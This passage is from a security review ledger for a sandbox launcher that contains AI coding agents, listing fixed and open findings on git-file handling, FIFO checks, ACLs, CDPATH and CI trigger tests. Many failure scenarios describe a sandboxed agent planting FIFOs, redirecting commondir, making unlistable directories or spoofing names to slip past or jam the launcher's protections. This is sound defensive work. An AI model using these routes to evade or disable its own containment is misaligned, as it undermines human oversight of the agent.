- Fix direction: stop following and reading indexes once the queue is past SANDBOX_GIT_MAX, since the launch will be refused. Optionally give all index reads one shared deadline.

### GIT-10: small agent-writable git files are read with no time bound after a `-f` check
- **Status: FIXED (batch 10)** — `86427b0`: every small git file is read under a 2 s bound (`_rd()`, `_git_file_config()`), and a read cut off refuses the launch through `_rd_fail()`, saying why (G84, G86).
- Severity: LOW. Confidence: PLAUSIBLE (from code; needs a race, not reproduced)
- Location: sandbox.sh: `GIT_DIR=/dev/null _rd_run "$f" git config --file "$f" "$@"`
- What's wrong: only the index read is wrapped in `timeout`. Config reads (`_git_file_config` and its callers: `core.worktree`, `extensions.*`, includes, exec keys) and the `head -c 4096` reads of `.git` files, `commondir` and `gitdir` all run after a `-f` test, with no bound.
- Failure scenario: a second container on an overlapping writable tree swaps one of these files for a FIFO between the test and the open. The launch then blocks for ever. This is a DoS only, because the launcher runs nothing it reads.
- Fix direction: route these reads through one bounded helper (`timeout 2`, or a non-blocking open), and treat a timeout as unreadable.

### GIT-11: the launcher writes `config`, `commondir` and `hooks/` into config-less repository fixtures a project tracks
- **Status: FIXED (batch 11)** — `04e56e3`: every bare repository gets the placeholders, a tracked test fixture too; `SANDBOX_GIT_FIXTURES`, which exempted listed fixtures (batch 10, `86427b0`), was dropped, because a committed list could name a bare repository you push to (LNCH-16; the user's choice). AGENTS.md says to ignore `<fixture>.git/commondir` and `<fixture>.git/config` in the project's `.gitignore`, and `config.worktree` where the fixture turns `extensions.worktreeConfig` on (G79).
- Severity: LOW. Confidence: CONFIRMED (reproduced: the fixture repro; after a launch, `git status` shows `?? testdata/fixture.git/commondir` and `?? testdata/fixture.git/config`)
- Location: sandbox.sh: `if [[ ! -e "$g/config" && ! -L "$g/config" ]]; then ( set -C; : > "$g/config" ) 2>/dev/null || _git_cant_make "$g" config; fi`
- What's wrong: any HEAD + `objects/` + `refs/` directory is protected, so a tracked test fixture with no config gets permanent untracked placeholder files. AGENTS.md does not mention this.
- Failure scenario: a project tracks `testdata/fixture.git/` with no config. After one launch its tree is dirty, and a test that relies on the fixture having no config behaves differently.
- Fix direction: no security fix is needed. Document it beside the placeholder text in AGENTS.md (add the files to the fixture's `.gitignore`). Or make the `config` placeholder only where a `.git` file or an index names the directory, or where it is named `.git`.

### GIT-12: a planted commondir can make the launcher write placeholders into any directory that has `objects/` and `refs/`
- **Status: WON'T FIX (batch 10)** — `86427b0`: kept as it is. Git reads a common directory's config and hooks for its worktrees with no `HEAD` there, so the placeholders are what protects a real one; `_is_common_dir()`'s comment says why no `HEAD` is required.
- Severity: LOW. Confidence: CONFIRMED (reproduced: `app/w` with HEAD and `commondir` = `../node_modules/pkg`, where `pkg` has only `objects/` and `refs/`. The launch creates `config`, `commondir` and `hooks/` in `pkg` and binds them read-only)
- Location: sandbox.sh: `_is_common_dir()`, then `-d objects && -d refs`. Since GIT-69 (2026-11-12) it takes `objects` and `refs` whatever they are, more than git does, so the shape that draws placeholders is wider still; the same trade-off holds.
- What's wrong: a commondir target needs only `objects/` and `refs/` to be queued. The protection step then treats it as a repository's own git directory and makes placeholders there. The files are inert, but they are permanent, untracked, and land where the agent chose.
- Failure scenario: the agent points a commondir at a dependency or data directory that happens to have that shape. That directory gets stray files, and pins that can return `EBUSY` inside the container.
- Fix direction: require HEAD before the placeholder step, and keep `_is_common_dir` for following only. Or document it.

### GIT-13: the git-side refusal of a searchable but unlistable `.git` is not gated on ownership
- **Status: RESOLVED (batch 10)** — `86427b0`: a `.git` you can search but not list refuses the launch whoever owns it; binding another user's whole needed its config proved inert, and each review found another way it was not (the user's choice; G66, G76).
- Severity: LOW. Confidence: CONFIRMED (reproduced: `gitown.sh M=0711`, uid 1234's `.git` in the primary, gives rc=1)
- Location: sandbox.sh: `if [[ "$kind" == unr && -x "$g" ]]; then`
- What's wrong: the launcher-side refusal now applies only when the agent could write into the directory. The git side still refuses any searchable but unlistable `.git`, whoever owns it. This fails closed, so it costs usability, not safety. r18 judged it acceptable, because the host's git opens files in it by name.
- Failure scenario: another user's 0711 or 0710 `.git` inside your writable tree blocks every launch, including one where the agent cannot enter the directory at all.
- Fix direction: optionally mirror the launcher gate (refuse when the agent owns it or could write into it, or when there is an ACL). Otherwise bind it read-only whole with the WARNING. Or keep it as is and say so in AGENTS.md.

### GIT-14: the git-side "cannot be listed" WARNING always prints `chmod u+rx`, even for another user's `.git`
- **Status: FIXED (batch 10)** — `86427b0`: one hint for every unlistable case, `_unlistable_hint()`: chmod for yours, the sandbox identity's for one `SANDBOX_UID` owns, its owner otherwise (G76).
- Severity: NIT. Confidence: CONFIRMED (reproduced: `gitown.sh M=0700`, owned by uid 1234, prints `Restore: chmod u+rx …/.git`)
- Location: sandbox.sh: `_unlistable_hint "$g" '         ' "$uid"`
- What's wrong: the other three unlistable hints switch on `-O`. This one does not, so it tells the user to run a command they cannot run.
- Failure scenario: a user with another user's 0700 `.git` in the tree is told to `chmod` it, which fails.
- Fix direction: switch on `[[ -O "$g" ]]`, as the refusal branch does, and print the "It is not yours" text otherwise.

### GIT-15: decoy worktree tops share the five-per-index gitlink WARNING budget
- **Status: FIXED (batch 10)** — `86427b0`: the skipped-gitlink WARNING names the checkout, as the index places it under its worktree, not the gitlink path alone (G43).
- Severity: NIT. Confidence: PLAUSIBLE (from code)
- Location: sandbox.sh: `printf 'WARNING: submodule %s of %s is not where its index says`
- What's wrong: `gskip` counts across every (gitlink, top) pair. The message names the gitlink path and the git directory, but not the top or the resolved checkout. A decoy top can fill the five named slots, or raise a false alarm for a gitlink that is fine under the real top. No protection is lost: following continues and the count is printed. The agent can also fill the budget directly through the worktree index it writes.
- Failure scenario: the user sees five WARNINGs about decoy checkouts and a bare "… and N more". The real one is only in the count.
- Fix direction: print `$co` instead of `$path`. Keep one budget per top, or name the real top's failures first.

### GIT-16: the index-read timeout is not applied on macOS, even where `gtimeout` exists
- **Status: FIXED** (2026-10-28). The index read probes `gtimeout` first, then `timeout` (both are GNU coreutils' and take the same arguments), and AGENTS.md says so. G44 now also runs with a recording `gtimeout` on `PATH` and requires it to bound the hanging read; red with the old probe. Not run on a Mac.
- Severity: NIT. Confidence: PLAUSIBLE (from code)
- Location: sandbox.sh: `read -r -a _gir_t <<< "$(_timeout_prefix)"`
- What's wrong: macOS has no `timeout(1)`, so the GIT-4 bound on the index read does not apply there. Homebrew coreutils installs `gtimeout`, which is not probed.
- Failure scenario: on a Mac, a concurrent container swaps an index for a FIFO after the check, and the launch blocks for ever.
- Fix direction: also probe `gtimeout`, and update the "not on macOS" wording in AGENTS.md.

### GIT-17: `CDPATH` is not cleared before `cd "$wt"` resolves a relative `core.worktree`
- **Status: FIXED** (2026-10-28). `sandbox.sh` unsets `CDPATH` at the top, not per function: an exported `CDPATH` also makes `cd` print the directory, into every `$(cd … && pwd)` in the launcher. Hermetic G90 (and batch 10's G73) in test-git-internals-ro.sh (now `tests/test-git-internals-ro-index.sh`): a submodule whose `core.worktree` is a bare relative name, with a nested submodule under a pruned `vendor/` that only its index finds; with `CDPATH` pointing at a decoy, the nested `.git` file lost its read-only bind on the old code.
- Severity: NIT. Confidence: PLAUSIBLE (from code)
- Location: sandbox.sh: `if [[ -n "$wt" ]] && _cd_phys wtp "$g" "$wt"; then`
- What's wrong: a relative `core.worktree` that does not start with `./` or `../` is resolved through the host shell's exported `CDPATH`. `sandbox.env` refuses `CDPATH`, but the user's own shell may export it. The commondir case fails closed (r2 checked this). This one can misplace the top, and with it the gitlink paths.
- Failure scenario: a user with `CDPATH` exported gets a submodule's gitlinks resolved under the wrong directory, so they are not followed.
- Fix direction: `local CDPATH=` at the top of `git_dirs_in` and `launcher_ro_overlay`.

### GIT-18: `_lex_norm` truncates a path at a newline
- **Status: FIXED** (2026-10-28). `_lex_norm()` splits by `${rest%%/*}`, as `_path_walk()` does. Hermetic G91: a `.git` file in a directory named `a<LF>b` naming `../real73` gave the spurious "through a link" `WARNING:` on the old code and gives none now; batch 10's G74 checks `_lex_norm()` itself.
- Severity: NIT. Confidence: PLAUSIBLE (from code)
- Location: sandbox.sh: `if [[ "$rest" == */* ]]; then rest="${rest#*/}"; else rest=""; fi`
- What's wrong: `read` stops at the first newline, so a `.git` file whose directory name holds a newline gets a truncated lexical path. That gives a spurious "through a link" WARNING, or a "does not exist" WARNING naming the wrong path. The follow decision uses the physical path, so this is cosmetic.
- Failure scenario: the agent names a directory `a<LF>b` and plants a `.git` file in it. The user sees a misleading WARNING.
- Fix direction: split with a `${p%%/*}` loop, as `_path_walk` does.

### GIT-19: the include budget counts empty and oversized entries, so planted repositories can spend it
- **Status: FIXED (batch 10)** — `86427b0`: empty and oversized include values count per config only, not toward the launch's 1000 (G72 covers the empty ones).
- Severity: NIT. Confidence: PLAUSIBLE (from code)
- Location: sandbox.sh: `if (( ++ients > 1000 )); then icut=1; ii=${#ifile[@]};`
- What's wrong: the per-launch counter is incremented before the empty-value and over-4096-byte `continue`s. Entries that cost nothing to check use up the budget.
- Failure scenario: the agent plants repositories with 1,000 empty `include.path` entries. Every later config, the user's own included, gets the "not every include was followed" WARNING. It is named, as designed, but the agent pays nothing for it.
- Fix direction: count only the entries that are actually walked.

### LNCH-5: an unlistable directory the agent made can pass as yours under a remapping file share with `SANDBOX_UID` overridden
- **Status: FIXED (batch 10)** — `86427b0`: a searchable but unlistable directory you own refuses too (`_agent_could_write()`; T25b).
- Severity: LOW. Confidence: CONFIRMED (reproduced, host side only: your own 0311 directory with `SANDBOX_UID=4242` gives rc=0, the overlay and a WARNING, not a refusal. The macOS ownership remap itself was reasoned, not run)
- Location: sandbox.sh: `[[ -O "$1" ]] || _agent_bits_writable "$@"`
- What's wrong: on Docker Desktop or Colima, files the agent creates appear on the host as owned by the launching user, not by `SANDBOX_UID`. With `SANDBOX_UID` overridden, `-user "$uid"` misses a 0311 directory the agent made, so the directory is overlaid instead of refused.
- Failure scenario: the agent plants a FIFO in a directory, then sets the directory to 0311. Later launches overlay it read-only with a WARNING. The agent can still open the FIFO by name through the overlay.
- Fix direction: also refuse when `[[ -O "$l" ]]`. You can always fix your own directory, and the hint already says how.

### LNCH-6: an ACL is invisible where `ls` does not mark one (busybox, CIFS)
- **Status: FIXED (batch 10)** — `86427b0`: `getfacl` decides where there is one (T25e, T25g); otherwise only GNU's or a BSD `ls` is trusted (T25g on macOS, which has no `getfacl`); refusing any other `ls` there is not tested (LNCH-18).
- Severity: LOW. Confidence: CONFIRMED (reproduced in r18: busybox `ls -ld` printed `d-wx-wx--x` for a directory with `setfacl -m u:4242:wx`, where GNU printed `d-wx-wx--x+`. The code is unchanged)
- Location: sandbox.sh: `a="$(cd / && getfacl -c -- "$1" 2>/dev/null)" || return 0`
- What's wrong: ACLs are detected only through the `+` that GNU and BSD `ls` print. busybox prints none, and GNU prints none for CIFS ACLs, so the bare mode passes. The group bits shown are then the ACL mask, judged against the directory's group, not the agent's.
- Failure scenario: on an Alpine host, a directory the agent can write through an ACL entry gets the overlay and a WARNING instead of a refusal.
- Fix direction: treat an `ls` that is neither GNU nor BSD (for example one that resolves to busybox) as unknown, and fail closed. Or, where `getfacl` exists, refuse on any entry beyond `user::`, `group::` and `other::`.

### LNCH-7: only the unlistable directory's own mode is judged, not an agent-writable subdirectory inside it
- **Status: DOCUMENTED (batch 10)** — `86427b0`: `_agent_could_write()`'s comment says that only the directory's own mode is judged.
- Severity: LOW. Confidence: PLAUSIBLE (from code; r18 built the layout with the own repro)
- Location: sandbox.sh: `# mode is judged; a writable directory inside another user's is not seen`
- What's wrong: another user's 0711 directory `d` holding a 0777 `d/sub` gets the overlay. A FIFO planted earlier in `d/sub` (by a run that mounted `d/sub` writable itself) is not found, and can be opened through the read-only overlay.
- Failure scenario: it needs names the agent cannot list, and a host user who runs a launcher inside another user's tree. That is the same class as content poisoned before the protection existed, which AGENTS.md lists as not covered.
- Fix direction: none is needed. Optionally, have the comment and AGENTS.md say that only the directory's own mode is judged.

### LNCH-8: `%q` sites still print bidi override characters raw (LNCH-3 residue)
- **Status: FIXED (batch 10)** — `86427b0`: every scanned name goes through `_q()`, which renders one the terminal cannot show as `$'…'`, exact when pasted (T52).
- Severity: LOW. Confidence: CONFIRMED (reproduced: under C.UTF-8, bash 5.3's `printf %q` prints U+202E as the raw bytes `e2 80 ae`)
- Location: sandbox.sh: `printf '         %s\n' "$(_q "${cl[k]}")" >&2`
- What's wrong: `_term` replaces C0, C1 and the bidi overrides, but many messages print scanned names with a bare `%q`. glibc counts U+202A–U+202E and U+2066–U+2069 as printable, so `%q` passes them through. Launcher sites: both refusal listings (`cl[k]`, `ug[k2]`), every `Restore: chmod u+rx %q`, `rm %q`, and the unchecked-launchers NOTE. Git sites: `cannot read the index of %q`, both gitlink WARNINGs (which print `$path` straight from the agent's index), `not every include of %q` / `git config --file %q`, `ls -l %q`, and `sends git to %q` (commondir contents).
- Failure scenario: the agent names a directory or a gitlink path with U+202E. The user's terminal shows a reordered name, so the WARNING or refusal points at a path that looks like something else.
- Fix direction: `$(_term "$(printf %q "$x")")`, or a small `_q` helper used at every `%q` site.

### LNCH-9: the agent can make every later launch refuse with a 0100 or 0311 directory in `.agent-blocked/`
- **Status: FIXED (batch 10)** — `86427b0`: a candidate inside an output directory's source only warns, whichever mount reaches it (T55).
- Severity: LOW. Confidence: CONFIRMED (reproduced: `blkfifo.sh V=dir000 DM=0100` gives rc=1, "…/.agent-blocked/d can be searched but not listed by you")
- Location: sandbox.sh: `[[ "${bsrc[i]##*/}" == "${bdst[i]##*/}" ]] && outsrc+=("${bsrc[i]}") ;; esac`
- What's wrong: the FIFO find now prunes the output directories, but `.agent-blocked` is itself a writable mount root. `launcher_dirs_in` scans it, and the unlistable refusal fires for a directory the agent leaves there. Nothing on the host reads that directory as code.
- Failure scenario: in the default layout the agent runs `mkdir d; chmod 0100 d` in `/workspace/.agent-blocked`. Every later launch refuses until the user fixes it. The message names the directory and gives `chmod u+rx`. The agent could force a correct refusal in the primary anyway.
- Fix direction: skip the `.agent-blocked` and `.agent-discovery` mount roots in the unlistable scan, or only WARN there.

### LNCH-10: the FIFO find over read-only sources has no prune and no bound
- **Status: FIXED (batch 10)** — `86427b0`: the FIFO search has 30 s per source and 90 s per launch, past which the launch is refused naming where (T56, T59).
- Severity: LOW. Confidence: PLAUSIBLE (r15 measured a 2 s launch for a planted launcher holding 200,000 files; the code is unchanged)
- Location: sandbox.sh: `fx="$(cd / && "${ft[@]}" find "$x" \( -type p -o -type b -o -type c \) -print -quit 2>"$ferr")" || frc=$?`
- What's wrong: every file under every launcher overlay and every bound git internal is walked, the engine checkout's `.git/objects` included. The agent controls the size, up to 50 launchers.
- Failure scenario: the agent fills planted launchers with millions of files. Every launch is slower, but nothing hangs.
- Fix direction: a file-count or time bound, past which the launch is refused with the directory named. Or prune `.git/objects`.

### LNCH-11: a FIFO can appear inside a read-only directory source between the find and `docker run`
- **Status: FIXED (batch 10)** — `86427b0`: `_ro_fifo_search()` runs again just before docker, and the output directories join the verify manifest (T57, T61).
- Severity: LOW. Confidence: PLAUSIBLE (from code; needs a concurrent container, not reproduced)
- Location: sandbox.sh: `if [[ -n "${_vrof[$_vsrc]:-}" ]] && [[ -p "$_vsrc"`
- What's wrong: at manifest time only FILE sources (`launcher_ro_files`) are rechecked. The contents of a directory overlay are not rechecked after the FIFO find.
- Failure scenario: a concurrent container, with that directory writable as one of its own mount roots, creates a FIFO there in the window. This launch then binds it read-only, and the agent can write through it.
- Fix direction: repeat the FIFO find for directory sources just before writing the manifest, or accept and document the race next to the existing concurrent-swap text.

### LNCH-12: the "It is not yours" hint is wrong when the sandbox identity owns the directory
- **Status: FIXED (batch 10)** — `86427b0`: with GIT-14, `_unlistable_hint()` (G76).
- Severity: NIT. Confidence: PLAUSIBLE (reproduced in r17 with the own repro case A, `SANDBOX_UID=4242` owning a 0711 directory; the hint code is unchanged)
- Location: sandbox.sh: `It belongs to the sandbox identity (SANDBOX_UID=%s)`
- What's wrong: the refusal is correct, but when the owner is the `SANDBOX_UID` you chose, the hint tells you to ask its owner.
- Failure scenario: a user with an overridden `SANDBOX_UID` gets advice that does not apply. The useful step is `sudo chmod u+rx`, or a `chown` back.
- Fix direction: add a third branch for a directory owned by `SANDBOX_UID`.

### LNCH-13: `aclm` is computed for every candidate, though only the unlistable branch uses it
- **Status: FIXED (batch 10)** — `86427b0`: the `ls` that reads the ACL mark runs only for an unlistable candidate, in `_agent_bits_writable()`.
- Severity: NIT. Confidence: PLAUSIBLE (from code)
- Location: sandbox.sh: `m="$(cd / && LC_ALL=C ls -ld "$1" 2>/dev/null)" || m=""; m="${m%% *}"`
- What's wrong: one `ls` fork runs per launcher candidate, launchers included. The cost is bounded by SANDBOX_LAUNCHER_MAX.
- Failure scenario: none beyond a few extra forks per launch.
- Fix direction: compute it inside the `kind == unreadable && -x` test.

### LNCH-14: `mktemp` runs on every launch, and a bad TMPDIR refuses every launch
- **Status: FIXED** (2026-10-28). The FIFO search makes its temporary file only when something is bound read-only, and its refusal names the directory: `cannot make a temporary file in <dir> (TMPDIR) …`. `_git_index_read()`, which needs a temporary directory too, says once per launch that it could not make one and that indexes are not read. Hermetic T51 in `tests/test-launcher-dir-ro.sh` (a stale TMPDIR launches when nothing is read-only, and is named when something is), red on the old code.
- Severity: NIT. Confidence: CONFIRMED (reproduced: `TMPDIR=/nonexistent` gives rc=1 with "ERROR: cannot make a temporary file". GNU mktemp's own line names the template, so the path shows there)
- Location: sandbox.sh: `printf 'ERROR: cannot make a temporary file in %s (TMPDIR); set TMPDIR to a writable directory.\n'`
- What's wrong: the temporary file is made even when `ro_srcs` is empty, and the launcher's own message does not name TMPDIR. `_git_index_read` depends on TMPDIR the same way.
- Failure scenario: a stale TMPDIR in the user's shell stops every launch, and the message does not say why.
- Fix direction: make the file only when there is something to search, and name `${TMPDIR:-/tmp}` in the error.

## 11. Found while fixing TST-14, TST-15 and SVC-4

### SVC-5: a MariaDB package without `/etc/mysql/my.cnf` would start latin1 with no message
- **Status: FIXED** (2026-10-27). The Dockerfile mariadb layer's closing checks now include `test -f /etc/mysql/my.cnf`, which follows the alternatives link, so a missing or dangling file fails the build. `tests/test-mariadb.sh` Part E reads the path from `services.d/mariadb.sh`'s `MARIADB_DEFAULTS=` default and requires the layer to test that same path; red with the check removed. Mutation `814-mariadb-no-client-compat` had that line as context and was updated; it applies.
- Severity: LOW. Confidence: PLAUSIBLE (every series measured ships the file: Ubuntu's 10.11, and 10.6, 10.11, 11.4 and 11.8 from MariaDB's repository, each a link to `mariadb.cnf`)
- Location: `services.d/mariadb.sh: svc_start()`, the `--defaults-file="$MARIADB_DEFAULTS" --print-defaults` probe
- What's wrong: a missing file makes the probe exit 1 with its error on `/dev/null`; `cs` is empty and the server starts with no character-set options — latin1 before 11.8. Before SVC-4 a missing file had the same effect.
- Fix direction: add `test -e /etc/mysql/my.cnf` to the Dockerfile mariadb layer's closing checks, so the build fails instead (that line is mutation `814-mariadb-no-client-compat`'s context, so regenerate it too).

### TST-16: an `exempt` row on `workflow_run` or an unfiltered `push` still verifies
- **Status: FIXED** (2026-10-27). The exempt check is now `tests/lib-layer-checks.sh: wf_reaches_prs()`, an ALLOW-list: rc 1 only when every trigger `_wf_triggers()` lists (the `wf_triggers_on` reader in a list mode) is `schedule`, `workflow_dispatch`, `repository_dispatch` or `release`, or a `push` kept off PR branches by `_wf_push_filters()` — tags filters with no branch filter (at first also a `branches:` list of plain names; TST-18 removed that). Any branch filter, `branches-ignore`, a paths filter alone or no filter counts. The first version listed PR triggers instead, and its review measured `pull_request_review`, `issue_comment`, `create`, `check_suite` and `status` passing as exempt: the TST-6 → TST-15 → TST-16 bypass moving one sibling further, which an allow-list ends. Its re-review found `workflow_call` on that list letting a reusable workflow pass as exempt though it runs whenever a `pull_request` caller does, while `wf_it_selections()` skipped the caller's job-level `uses:` in silence, so the callee's cases dropped out of the PR layer unseen. `workflow_call` is off the list, and `wf_it_selections()` now refuses a job-level `uses:` unless the callee is a local workflow that names `tests/integration/run.sh` nowhere (`hermetic-checks.yml` is), with fixtures for a callee that runs cases, a remote one, a missing one, and a caller gated off the event. The PR layer's integration cases are derived from `pull_request`, `pull_request_target` and `merge_group` together. Demonstrated by hand-adding `workflow_run`, then `push: branches: ["**"]`, to `release.yml` (the containment test fails naming each) and by turning `integration.yml`'s `pull_request` into `merge_group` (its cases still count in the PR layer).
- Severity: LOW. Confidence: PLAUSIBLE (from code)
- Location: `tests/test-layer-containment.sh: for trig in pull_request pull_request_target merge_group; do`
- What's wrong: `workflow_run` (fired by a PR workflow finishing) and an `on: push` with no branch filter also run on every PR branch push from the same repository, and neither is checked. Separately, the PR layer derives cases for `pull_request` only, so a `cases` workflow triggered only by `merge_group` or `pull_request_target` adds nothing to the PR set. That is harmless while "every case runs nightly" keeps PR ⊆ nightly.
- Fix direction: refuse `workflow_run` in an exempt row, and `push` unless its `branches:` filter excludes PR branches. Derive the PR layer from all three PR triggers.

### TST-17: nothing automated pins the exempt-row trigger loop
- **Status: FIXED** (2026-10-27, with TST-16). The predicate moved into `wf_reaches_prs()` and is driven by fixture workflows in `tests/test-layer-checks-parser.sh` — the allow-list, each sibling trigger, every push filter shape, and the shapes it refuses. Shortening the trigger handling, letting every push through, ignoring branch globs or ignoring tags-only filters each turned them red. The falsify target scores 260 killed of 266; the first version left 12 unledgered survivors in the new awk, which the review found, and the killing fixtures were added for all but one, ledgered EQUIVALENT (entry 22). What is still pinned only by the repo's own workflows is the test's mapping of the verdict to pass/fail (TST-19).
- Severity: LOW. Confidence: CONFIRMED (TST-15's demonstration was a hand edit of `release.yml`)
- Location: `tests/test-layer-containment.sh`, the `exempt)` branch
- What's wrong: the loop runs only over the repo's own workflows, none of which uses the sibling triggers, so cutting it back to `pull_request` alone keeps the suite green. The parser test's vectors cover `wf_triggers_on()`, not this loop.
- Fix direction: move the exempt check into a function in `tests/lib-layer-checks.sh` and drive it from fixture workflows in `tests/test-layer-checks-parser.sh`.

## 12. Found while fixing SVC-5, TST-16 and TST-17

### TST-18: a push on plain branch names is taken as never reaching a PR
- **Status: FIXED** (2026-10-27). Any `branches:` filter now counts, plain names included: a tag-only push is the one shape that is provably off PRs, since a PR can be opened from any branch and the default branch is the remote's to say, not a hermetic test's. `release.yml` is tag-only, so no row changes. Fixtures for named branches, named branches beside tags and quoted names were each red on the previous code; a scalar `tags: v1` fixture kills the one new survivor. Its review found an empty flow list invisible to the reader, older than this fix: `tags: [v1]` with `branches-ignore: []` was rc 1 though the push runs on every branch. `_wf_push_filters()` now names a filter whose list is empty; fixtures for that and for the message's branch name.
- Severity: LOW. Confidence: CONFIRMED (by design, written in `wf_reaches_prs()`'s header)
- Location: `tests/lib-layer-checks.sh: wf_reaches_prs()`, its branch-filter test (then `(( wide )) || return 1`)
- What's wrong: `on: push: branches: [dev]` is rc 1, but a PR opened from `dev` runs that workflow on every push to it. No workflow here has that shape: the exempt ones are tag-only or have no push.
- Fix direction: count only the repository's default branch as off PRs, or refuse any branch filter in an exempt row.

### TST-19: the containment test's verdict mapping is pinned only by the repo's own workflows
- **Status: FIXED** (2026-10-28). The row verdict is `tests/lib-layer-checks.sh: wf_row_verdict()` (rc 0 holds, 1 fails, 3 inert, the message on stdout); the test only maps the status. Fixture rows in `tests/test-layer-checks-parser.sh` drive every branch: an exempt row on a PR-triggered and on an unreadable workflow, a stale classified and cases row, an empty `<why>`, an unknown coverage, the inert exempt row. Turning the exempt-on-PR arm into a pass, or the inert row into one, each turned them red. The fixture also caught `pull_request` reported as "not a trigger known to stay off pull requests"; known PR triggers are now named plainly.
- Severity: LOW. Confidence: CONFIRMED (both exempt workflows give rc 1, so the `0)` and `*)` arms never run in the suite)
- Location: `tests/test-layer-containment.sh`, the `exempt)` branch's `case "$ex_rc"`
- What's wrong: turning the `0)` arm into a pass keeps the suite green. The hand edits of `release.yml` showed it working once.
- Fix direction: move the row verdict (classified/cases/exempt → pass or the failure text) into a lib function and drive it with fixture rows.

### TST-20: the PR layer's cases and the exempt check define "PR-triggered" differently
- **Status: FIXED** (2026-10-28). `wf_pr_events()` lists, per workflow, the triggers `wf_reaches_prs()` counts as PR activity (every trigger off the allow-list, and push when it reaches PR branches); `wf_reaches_prs()` is built on it and the containment test derives the PR layer's cases from it, skipping only `workflow_call`, whose callers' `uses:` `wf_it_selections()` already refuses unless the callee runs no case. Demonstrated by deleting `pull_request:` from `integration.yml`: main's code failed "that layer derived to nothing"; now its push to `main` (counted since TST-18) derives the same 30 cases. Its review found the first version dropping what it had decided when push filters could not be read: `on: {push: {branches: [main]}, pull_request:}` (a flow-map push) made the workflow add no cases and the exempt check answer "cannot tell" though `pull_request` settles it. `wf_pr_events()` now lists every event it could decide and returns 2 at the end, `wf_reaches_prs()` answers from a non-push event first, and the containment test fails but still uses the events listed, as it already did for a step it could not read; fixtures for both orders were red on the first version.
- Severity: LOW. Confidence: CONFIRMED (from code); harmless while "every case runs nightly" holds
- Location: `tests/test-layer-containment.sh: layer_events`
- What's wrong: cases are derived for `pull_request`, `pull_request_target` and `merge_group`, while `wf_reaches_prs()` also counts `workflow_run`, an unfiltered `push` and any unknown trigger. A `cases` workflow on `push` alone adds nothing to the PR set.
- Fix direction: derive the PR set from the same predicate, once `wf_it_selections()` can render `push`.

### TST-21: smaller gaps in the push-filter reader
- **Status: PARTLY FIXED** (2026-10-28). Both readers split a flow list on the commas outside quotes (`splitq()` in `_wf_on_awk()` and in `_wf_push_filters()`), so `branches: ['a,b']` is one entry and `on: [schedule, 'push, pull_request']` names no push. A quote opens a quoted entry only as its first character (`tags: [it's, main]` is two entries), and one left open makes the list unreadable (rc 2), as the review asked; fixtures for both and for `wf_pr_events()` were red with the plain `split`, green under mawk 1.3.4 and gawk. The `tests/layer-checks.conf` comment names `wf_reaches_prs()` here since `c761628`; still open: the same edit in mgd-ai-containers' copy, which must stay byte-identical and is not reachable from the machine that made this one (the patch is the hunk of `c761628` in that file).
- Severity: LOW. Confidence: CONFIRMED
- Location: `tests/lib-layer-checks.sh: _wf_push_filters()`; `tests/layer-checks.conf`, the `workflow` row-type comment
- What's wrong: a quoted comma inside a flow list is split (`branches: ['a,b']` reads as `'a` and `b'`); the answer stays conservative unless the halves hide a glob. And `tests/layer-checks.conf` still says the exempt claim is checked by `wf_triggers_on`; it is kept byte-identical with mgd-ai-containers' copy, so it changes there and here together.
- Fix direction: split flow lists outside quotes; update the comment in both repositories at once.

### TST-22: `assert_runs` prints an ELF binary's bytes as its "shebang"
- **Status: FIXED** (2026-10-29). The dump prints `shebang:` only when the file starts with `#!`, `binary:  ELF` when bytes 2 to 4 read `ELF` (read with `head -c 4 | tail -c 3`, never a NUL), and `shebang: none` otherwise. `tests/test-integration-lib.sh` runs an ELF header that cannot execute and a script with no `#!` through the fake docker; both red on the old code. Its review: NULs are dropped before `$( )` in both probes, so a zero-filled file (a truncated binary) draws no warning either (a test now), and the vectors sit behind the same `readlink -f` guard as the shebang one, which pre-12.3 macOS lacks.
- Severity: LOW. Confidence: CONFIRMED (case 310 against mutation `311-libatomic-not-installed`)
- Location: `tests/integration/lib.sh: assert_runs()`, the diagnostic printed after `FAILED TO RUN`
- What's wrong: for a binary that fails to run, the dump reads the target's first line as a shebang whatever it is, so for `node`, an ELF file, it prints raw bytes and bash warns `command substitution: ignored null byte in input` into the case's output. The `error:` line beneath it still names the cause.
- Fix direction: print `shebang:` only when the first two bytes are `#!`, and say `ELF binary` otherwise.

## 13. Found while fixing LNCH-14, GIT-16, GIT-17 and GIT-18

### GIT-20: the other entry points still resolve their own directory through `CDPATH`
- **Status: FIXED** (2026-10-28). Every host entry point that resolves its own directory unsets `CDPATH` right after its `set` line: the six named here and `migrate-runme.sh`, `ai-containers-report.sh`, `release-title.sh`, `changelog-coverage.sh`, `changelog-section.sh`, `check-sandbox-version.sh` and `bump-sandbox-version.sh`. The in-container link scripts `cd` to absolute paths only, which `CDPATH` never redirects. New hermetic `tests/test-cdpath.sh` runs each of the 14 as `bash eng/<script>` with `CDPATH` naming a decoy `eng/`, and requires the first file it sources to be its own; the 13 changed here each failed on the old code, with the path printed twice. Its review found the one that failed silently: the `runme.sh` that `project-init.sh: emit_launcher()` generates, run as `bash .ai-containers/runme.sh` with a `CDPATH` holding another project's `.ai-containers`, built and started THAT project with no error. The generated launcher now unsets `CDPATH` before its `cd` (so does `migrate-runme.sh`, which reuses it), and `sync-to-projects.sh: backfill_launcher_cdpath()` inserts the line into launchers generated before, in place and once (`tests/test-launcher-migration.sh` case 4). `tests/test-cdpath.sh` runs a generated `runme.sh` against a decoy (red on the old launcher), and fails for any root script that resolves its own directory but is in neither its entry-point list nor its two sourced libraries. `verify-on-host.sh` and `capture-on-host.sh` unset it too.
- Severity: LOW. Confidence: PLAUSIBLE (from code)
- Location: `build.sh`, `repo.sh`, `group.sh`, `project-init.sh`, `sync-to-projects.sh`, `extract-discovery.sh`: each resolves its directory with `cd "$(dirname "${BASH_SOURCE[0]}")" && pwd` and leaves `CDPATH` set.
- What's wrong: `sandbox.sh` now unsets `CDPATH`; the others do not. A relative invocation (`bash sub/build.sh`) with an exported `CDPATH` that also holds a `sub/` resolves there, and `cd` prints the directory too, so the captured path comes back as two lines.
- Fix direction: the same `unset CDPATH` at the top of each entry point, with one test that runs an entry point under a decoy `CDPATH`.

### ENV-8: the `ai-containers.project` label publishes the project's path with a pushed image
